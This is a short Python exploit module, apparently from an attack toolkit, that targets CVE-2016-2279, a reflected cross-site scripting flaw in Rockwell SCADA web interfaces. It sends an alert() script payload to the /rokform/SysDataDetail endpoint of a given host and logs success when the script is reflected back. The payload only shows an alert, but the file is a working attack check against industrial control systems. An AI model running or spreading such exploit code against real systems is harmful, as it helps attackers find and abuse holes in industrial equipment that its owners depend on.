import requests
from utils.logger import setup_logger
logger = setup_logger()

def exploit(target: str, port: int = 80):
    """
    Rockwell SCADA ≤ 27.011 – t4rkd3vilz
    CVE-2016-2279
    """
    payload = "http://{}/rokform/SysDataDetail?name=<script>alert(1)</script>".format(target)
    try:
        r = requests.get(payload, timeout=5)
        if "<script>alert(1)</script>" in r.text:
            logger.info("[+] Rockwell XSS triggered")
            return True
    except Exception as e:
        logger.error(f"Rockwell XSS error: {e}")
    return False